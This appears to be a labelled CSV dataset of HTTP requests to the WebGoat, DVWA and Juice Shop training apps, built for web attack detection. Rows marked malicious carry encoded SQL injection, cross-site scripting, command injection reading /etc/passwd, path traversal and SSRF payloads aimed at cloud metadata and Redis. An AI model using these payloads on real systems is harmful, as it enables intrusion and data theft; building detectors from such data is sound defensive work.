timestamp,app,method,url,path,query,post_data,label
2026-04-20T15:00:00.347860+00:00,webgoat,GET,http://localhost:8082/service/lessonmenu.mvc?search=1+OR+1%3D1--,/service/lessonmenu.mvc,search=1+OR+1%3D1--,,malicious
2026-03-10T05:03:08.158801,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:00.607860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?host=8.8.8.8+%7C+id,/dvwa/js/dvwaPage.js,host=8.8.8.8+%7C+id,,malicious
2026-04-20T15:00:00.503860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?ip=127.0.0.1%3B+sleep+5,/dvwa/js/add_event_listeners.js,ip=127.0.0.1%3B+sleep+5,,malicious
2026-04-20T15:00:02.346860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,url=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T04:52:06.819566,webgoat,GET,https://www.youtube.com/embed/RijGNytjbOI?rel=0,https://www.youtube.com/embed/RijGNytjbOI,rel=0,,benign
2026-03-10T04:23:18.158672,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-03-10T04:43:44.630287,dvwa,GET,http://localhost:8081/vulnerabilities/brute/,/vulnerabilities/brute/,,,benign
2026-03-10T05:08:31.528239,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=Hijacking&index=5,/service/hint.mvc,lessonName=Hijacking&index=5,,benign
2026-04-20T15:00:01.925860+00:00,webgoat,GET,http://localhost:8082/download?file=..%252f..%252f..%252f..%252fetc%252fpasswd,/download,file=..%252f..%252f..%252f..%252fetc%252fpasswd,,malicious
2026-04-20T15:00:03.257860+00:00,webgoat,GET,http://localhost:8082/https://www.youtube.com/s/player/44899b31/www-player.css?user=admin%27+--,/https://www.youtube.com/s/player/44899b31/www-player.css,user=admin%27+--,,malicious
2026-03-10T04:22:58.267404,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc,/service/hint.mvc,,,benign
2026-03-10T05:01:23.243686,juiceshop,GET,http://localhost:3000/assets/public/images/products/green_smoothie.jpg,/assets/public/images/products/green_smoothie.jpg,,,benign
2026-04-20T15:00:00.254860+00:00,juiceshop,GET,http://localhost:3000/fetch?target=file%3A%2F%2F%2Fetc%2Fpasswd,/fetch,target=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:03.072860+00:00,juiceshop,GET,http://localhost:3000/MaterialIcons-Regular.woff2?id=admin%27+--,/MaterialIcons-Regular.woff2,id=admin%27+--,,malicious
2026-04-20T15:00:03.311860+00:00,webgoat,GET,http://localhost:8082/js/libs/jquery.min.js?path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/js/libs/jquery.min.js,path=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-03-10T04:22:57.944197,webgoat,GET,http://localhost:8082/WebGoat/fonts/fontawesome-webfont.woff?v=4.0.3,/fonts/fontawesome-webfont.woff,v=4.0.3,,benign
2026-03-10T05:07:19.348742,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-03-10T04:57:23.583118,webgoat,GET,http://localhost:8082/WebGoat/images/tom.png,/images/tom.png,,,benign
2026-04-20T15:00:00.540860+00:00,juiceshop,GET,http://localhost:3000/rest/user/whoami?page=%3Csvg%2Fonload%3Dalert%281%29%3E,/rest/user/whoami,page=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:01.197860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,username=1%27+AND+%271%27%3D%271,malicious
2026-03-10T05:04:04.449687,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/controller/LessonController.js,/js/goatApp/controller/LessonController.js,,,benign
2026-04-20T15:00:04.213860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?host=localhost%3B+uname+-a,/dvwa/js/dvwaPage.js,host=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:00.647860+00:00,juiceshop,POST,http://localhost:3000/api/review,/api/review,,token=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T05:09:17.369301,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:01.098860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/support/GoatUtils.js?host=%27+OR+%271%27%3D%271%27+--+,/js/goatApp/support/GoatUtils.js,host=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-04-20T15:00:04.467860+00:00,webgoat,GET,http://localhost:8082/export?file=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/export,file=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:01.350860+00:00,dvwa,POST,http://localhost:8081/comment,/comment,,email=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T04:57:09.227388,webgoat,GET,http://localhost:8082/WebGoat/HttpProxies.lesson,/HttpProxies.lesson,,,benign
2026-04-20T15:00:04.945860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?user=%27+UNION+SELECT+1%2C2%2C3--,/dvwa/images/logo.png,user=%27+UNION+SELECT+1%2C2%2C3--,,malicious
2026-03-10T04:49:01.580150,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:01.556860+00:00,dvwa,GET,http://localhost:8081/webhook/test?target=http%3A%2F%2F127.0.0.1%3A22,/webhook/test,target=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-03-10T05:09:13.014099,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:02.965860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/model/MenuCollection.js?url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/js/goatApp/model/MenuCollection.js,url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:04.954860+00:00,juiceshop,GET,http://localhost:3000/api/Products?user=admin%27+--,/api/Products,user=admin%27+--,,malicious
2026-04-20T15:00:02.326860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/vulnerabilities/xss_r/,file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:02.945860+00:00,webgoat,GET,http://localhost:8082/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff?name=admin%27+--,/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,name=admin%27+--,,malicious
2026-03-10T04:20:20.561784,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/MenuButtonView.js,/js/goatApp/view/MenuButtonView.js,,,benign
2026-03-10T05:01:26.978970,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T04:57:04.454801,webgoat,GET,http://localhost:8082/WebGoat/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,,,benign
2026-03-10T04:21:21.755529,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:03.021860+00:00,juiceshop,POST,http://localhost:3000/api/login,/api/login,,comment=1+OR+1%3D1--,malicious
2026-03-10T05:02:23.917715,juiceshop,GET,http://localhost:3000/font-mfizz.woff,/font-mfizz.woff,,,benign
2026-03-10T05:04:04.409750,webgoat,GET,http://localhost:8082/WebGoat/css/animate.css,/css/animate.css,,,benign
2026-04-20T15:00:02.516860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,url=%27+OR+%271%27%3D%271%27+--+,malicious
2026-03-10T04:21:56.848003,juiceshop,GET,http://localhost:3000/rest/products/search?q=,/rest/products/search,q=,,benign
2026-03-10T05:12:08.363896,webgoat,GET,https://i.ytimg.com/vi_webp/D1S-G8rJrEk/maxresdefault.webp,https://i.ytimg.com/vi_webp/D1S-G8rJrEk/maxresdefault.webp,,,benign
2026-03-10T04:47:27.071418,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:03.070860+00:00,webgoat,GET,http://localhost:8082/css/img/logoBG.jpg?user=%3Cbody+onload%3Dalert%28document.domain%29%3E,/css/img/logoBG.jpg,user=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-04-20T15:00:02.653860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?id=%27+UNION+SELECT+1%2C2%2C3--,/dvwa/js/dvwaPage.js,id=%27+UNION+SELECT+1%2C2%2C3--,,malicious
2026-04-20T15:00:04.211860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/dvwa/images/logo.png,name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T04:52:07.134995,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:01.181860+00:00,webgoat,POST,http://localhost:8082/service/hint.mvc,/service/hint.mvc,,email=%27+OR+%271%27%3D%271%27+--+,malicious
2026-03-10T04:53:27.776536,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:19:26.034436,juiceshop,GET,http://localhost:3000/rest/products/38/reviews,/rest/products/38/reviews,,,benign
2026-03-10T04:53:33.352935,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T05:07:32.439632,webgoat,GET,https://static.doubleclick.net/instream/ad_status.js,https://static.doubleclick.net/instream/ad_status.js,,,benign
2026-03-10T04:57:52.503915,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=GeneralHeader&index=4,/service/hint.mvc,lessonName=GeneralHeader&index=4,,benign
2026-04-20T15:00:04.843860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/lemon_juice.jpg?user=%3Csvg%2Fonload%3Dalert%281%29%3E,/assets/public/images/products/lemon_juice.jpg,user=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-03-10T05:02:38.815704,webgoat,GET,http://localhost:8082/WebGoat/images/chrome-manual-proxy.png,/images/chrome-manual-proxy.png,,,benign
2026-04-20T15:00:01.835860+00:00,webgoat,GET,http://localhost:8082/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2?ip=127.0.0.1+%26%26+whoami,/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2,ip=127.0.0.1+%26%26+whoami,,malicious
2026-03-10T05:04:42.040293,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:04.893860+00:00,dvwa,POST,http://localhost:8081/submit,/submit,,message=1%27+AND+%271%27%3D%271,malicious
2026-03-10T04:25:28.157597,webgoat,GET,http://localhost:8082/WebGoat/css/img/logoBG.jpg,/css/img/logoBG.jpg,,,benign
2026-03-10T05:12:30.471651,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=GeneralHeader&index=4,/service/hint.mvc,lessonName=GeneralHeader&index=4,,benign
2026-03-10T04:54:03.233493,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:21:36.683549,dvwa,GET,http://localhost:8081/vulnerabilities/weak_id/,/vulnerabilities/weak_id/,,,benign
2026-03-10T04:46:48.769118,juiceshop,GET,http://localhost:3000/api/Products/35,/api/Products/35,,,benign
2026-04-20T15:00:01.496860+00:00,juiceshop,GET,http://localhost:3000/proxy?dest=file%3A%2F%2F%2Fetc%2Fpasswd,/proxy,dest=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T04:18:42.423366,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:02:35.193243,webgoat,GET,http://localhost:8082/WebGoat/service/lessoninfo.mvc/HttpBasics.lesson,/service/lessoninfo.mvc/HttpBasics.lesson,,,benign
2026-04-20T15:00:02.350860+00:00,webgoat,GET,http://localhost:8082/proxy?url=http%3A%2F%2F127.0.0.1%3A22,/proxy,url=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:00.859860+00:00,dvwa,POST,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,comment=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:02.710860+00:00,juiceshop,POST,http://localhost:3000/submit,/submit,,email=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:03.238860+00:00,juiceshop,POST,http://localhost:3000/submit,/submit,,comment=%27+OR+%271%27%3D%271%27+--+,malicious
2026-04-20T15:00:00.158860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/view/UserAndInfoView.js?host=%3Csvg%2Fonload%3Dalert%281%29%3E,/js/goatApp/view/UserAndInfoView.js,host=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-03-10T05:10:29.861516,juiceshop,GET,http://localhost:3000/rest/products/search?q=,/rest/products/search,q=,,benign
2026-03-10T05:06:53.433506,juiceshop,POST,http://localhost:3000/socket.io/?EIO=4&transport=polling&t=PpM90zp&sid=TZBpbejCrx3fscuIAAAw,/socket.io/,EIO=4&transport=polling&t=PpM90zp&sid=TZBpbejCrx3fscuIAAAw,40,benign
2026-04-20T15:00:02.201860+00:00,webgoat,GET,http://localhost:8082/fetch?url=http%3A%2F%2Flocalhost%2Fadmin,/fetch,url=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-03-10T04:49:23.463176,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:03.636860+00:00,webgoat,POST,http://localhost:8082/css/img/nllang.svg,/css/img/nllang.svg,,email=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:00.645860+00:00,webgoat,GET,http://localhost:8082/js/libs/jquery-2.1.4.min.js?q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/js/libs/jquery-2.1.4.min.js,q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:03.043860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/upload/?name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/vulnerabilities/upload/,name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T05:10:29.861516,juiceshop,GET,http://localhost:3000/api/Quantitys/,/api/Quantitys/,,,benign
2026-03-10T04:53:28.828373,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.495860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/dvwa/js/add_event_listeners.js,dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-04-20T15:00:04.105860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/?file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/vulnerabilities/sqli/,file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:04.227860+00:00,juiceshop,GET,http://localhost:3000/api/Products/24?host=127.0.0.1%3B+sleep+5,/api/Products/24,host=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T05:08:35.889925,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/LessonInfoModel.js,/js/goatApp/model/LessonInfoModel.js,,,benign
2026-03-10T04:47:11.067897,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/HelpControlsView.js,/js/goatApp/view/HelpControlsView.js,,,benign
2026-03-10T04:48:58.103476,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:21:51.060195,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.417860+00:00,juiceshop,GET,http://localhost:3000/fetch?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/fetch,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-04-20T15:00:00.348860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?q=%3Cbody+onload%3Dalert%28document.domain%29%3E,/service/hint.mvc,q=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-03-10T04:24:39.385808,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:56:47.136608,juiceshop,GET,http://localhost:3000/api/Challenges/?sort=price&order=ASC,/api/Challenges/,sort=price&order=ASC,,benign
2026-04-20T15:00:02.999860+00:00,webgoat,GET,http://localhost:8082/css/main.css?host=1+OR+1%3D1--,/css/main.css,host=1+OR+1%3D1--,,malicious
2026-04-20T15:00:01.271860+00:00,webgoat,GET,http://localhost:8082/service/lessonoverview.mvc?target=127.0.0.1%3B+sleep+5,/service/lessonoverview.mvc,target=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T04:57:03.575149,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/controller/MenuController.js,/js/goatApp/controller/MenuController.js,,,benign
2026-03-10T05:09:02.046733,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T05:07:26.197145,webgoat,GET,http://localhost:8082/WebGoat/lesson_js/jwt-voting.js,/lesson_js/jwt-voting.js,,,benign
2026-03-10T04:24:41.628783,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/?id=5&Submit=Submit,/vulnerabilities/sqli/,id=5&Submit=Submit,,benign
2026-04-20T15:00:02.857860+00:00,webgoat,POST,http://localhost:8082/login,/login,,username=admin%27+--,malicious
2026-03-10T04:52:37.665951,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=GeneralHeader&index=2,/service/hint.mvc,lessonName=GeneralHeader&index=2,,benign
2026-03-10T04:51:04.294192,juiceshop,GET,http://localhost:3000/api/Products?sort=id&order=ASC&limit=5,/api/Products,sort=id&order=ASC&limit=5,,benign
2026-04-20T15:00:02.182860+00:00,dvwa,POST,http://localhost:8081/api/login,/api/login,,password=%27+OR+%271%27%3D%271%27+--+,malicious
2026-04-20T15:00:00.261860+00:00,webgoat,GET,http://localhost:8082/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2?url=%3Csvg%2Fonload%3Dalert%281%29%3E,/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2,url=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-03-10T04:49:14.824782,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.136860+00:00,webgoat,GET,http://localhost:8082/start.mvc?user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/start.mvc,user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T04:56:24.566777,juiceshop,GET,http://localhost:3000/api/Products?sort=updatedAt&order=ASC&limit=6,/api/Products,sort=updatedAt&order=ASC&limit=6,,benign
2026-03-10T04:51:46.359986,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/GoatRouter.js,/js/goatApp/view/GoatRouter.js,,,benign
2026-04-20T15:00:00.056860+00:00,juiceshop,POST,http://localhost:3000/comment,/comment,,email=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-03-10T04:47:09.120561,webgoat,GET,http://localhost:8082/WebGoat/js/search.js,/js/search.js,,,benign
2026-03-10T05:02:33.106715,webgoat,GET,http://localhost:8082/WebGoat/js/libs/bootstrap.min.js,/js/libs/bootstrap.min.js,,,benign
2026-03-10T04:20:20.561784,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/LessonInfoModel.js,/js/goatApp/model/LessonInfoModel.js,,,benign
2026-03-10T04:47:32.042125,webgoat,GET,http://localhost:8082/WebGoat/lesson_js/jwt-voting.js,/lesson_js/jwt-voting.js,,,benign
2026-03-10T05:04:08.056767,dvwa,GET,http://localhost:8081/security.php,/security.php,,,benign
2026-04-20T15:00:01.645860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?page=%3Csvg%2Fonload%3Dalert%281%29%3E,/service/hint.mvc,page=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:01.116860+00:00,juiceshop,GET,http://localhost:3000/view?template=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,/view,template=..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,malicious
2026-04-20T15:00:04.923860+00:00,juiceshop,GET,http://localhost:3000/https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css?page=%27+OR+SLEEP%285%29--,/https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css,page=%27+OR+SLEEP%285%29--,,malicious
2026-04-20T15:00:03.987860+00:00,webgoat,GET,http://localhost:8082/login?url=1+OR+1%3D1--,/login,url=1+OR+1%3D1--,,malicious
2026-04-20T15:00:01.392860+00:00,dvwa,POST,http://localhost:8081/login,/login,,token=%27+OR+SLEEP%285%29--,malicious
2026-03-10T04:46:57.060483,juiceshop,GET,http://localhost:3000/api/Challenges/?sort=id&order=DESC,/api/Challenges/,sort=id&order=DESC,,benign
2026-04-20T15:00:04.970860+00:00,juiceshop,POST,http://localhost:3000/api/login,/api/login,,email=1%27+AND+%271%27%3D%271,malicious
2026-03-10T05:10:44.632792,juiceshop,GET,http://localhost:3000/rest/products/38/reviews,/rest/products/38/reviews,,,benign
2026-04-20T15:00:02.998860+00:00,juiceshop,POST,http://localhost:3000/assets/public/images/products/fruit_press.jpg,/assets/public/images/products/fruit_press.jpg,,token=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:04.175860+00:00,webgoat,GET,http://localhost:8082/plugins/bootstrap/css/bootstrap.min.css?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/plugins/bootstrap/css/bootstrap.min.css,ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:02.485860+00:00,juiceshop,GET,http://localhost:3000/rest/products/22/reviews?target=8.8.8.8+%7C+id,/rest/products/22/reviews,target=8.8.8.8+%7C+id,,malicious
2026-03-10T04:57:03.501721,webgoat,GET,http://localhost:8082/WebGoat/fonts/fontawesome-webfont.woff?v=4.0.3,/fonts/fontawesome-webfont.woff,v=4.0.3,,benign
2026-03-10T05:10:21.704745,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:02.720860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?ip=127.0.0.1%3B+sleep+5,/vulnerabilities/xss_r/,ip=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T04:21:37.732307,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?name=Alice,/vulnerabilities/xss_r/,name=Alice,,benign
2026-03-10T05:02:32.291533,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/WebGoatIntroduction.lesson,/service/lessonoverview.mvc/WebGoatIntroduction.lesson,,,benign
2026-04-20T15:00:02.107860+00:00,webgoat,GET,http://localhost:8082/XSS.lesson?target=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/XSS.lesson,target=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.042860+00:00,webgoat,GET,http://localhost:8082/proxy?dest=file%3A%2F%2F%2Fetc%2Fpasswd,/proxy,dest=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.179860+00:00,juiceshop,POST,http://localhost:3000/submit,/submit,,url=1%27+AND+%271%27%3D%271,malicious
2026-04-20T15:00:01.006860+00:00,juiceshop,GET,http://localhost:3000/download?template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/download,template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-04-20T15:00:02.495860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?host=localhost%3B+uname+-a,/dvwa/css/main.css,host=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:03.060860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?cmd=localhost%3B+uname+-a,/dvwa/js/add_event_listeners.js,cmd=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:01.101860+00:00,webgoat,POST,http://localhost:8082/api/review,/api/review,,message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-03-10T04:54:02.243600,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:02.001860+00:00,juiceshop,GET,http://localhost:3000/proxy?target=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/proxy,target=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-03-10T05:00:55.748518,dvwa,GET,http://localhost:8081/vulnerabilities/sqli_blind/?id=39&Submit=Submit,/vulnerabilities/sqli_blind/,id=39&Submit=Submit,,benign
2026-03-10T04:18:32.821391,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:00.306860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/controller/LessonController.js?q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/js/goatApp/controller/LessonController.js,q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:02.392860+00:00,webgoat,POST,http://localhost:8082/css/img/logoBG.jpg,/css/img/logoBG.jpg,,email=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T05:02:22.838798,juiceshop,GET,http://localhost:3000/rest/products/search?q=,/rest/products/search,q=,,benign
2026-03-10T04:55:12.792126,juiceshop,GET,http://localhost:3000/vendor.js,/vendor.js,,,benign
2026-04-20T15:00:02.767860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?file=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/service/hint.mvc,file=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:00.625860+00:00,juiceshop,GET,http://localhost:3000/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/proxy,url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T05:11:24.820525,juiceshop,GET,http://localhost:3000/api/Challenges/?sort=name&order=DESC,/api/Challenges/,sort=name&order=DESC,,benign
2026-03-10T05:01:38.470328,juiceshop,GET,http://localhost:3000/rest/products/22/reviews,/rest/products/22/reviews,,,benign
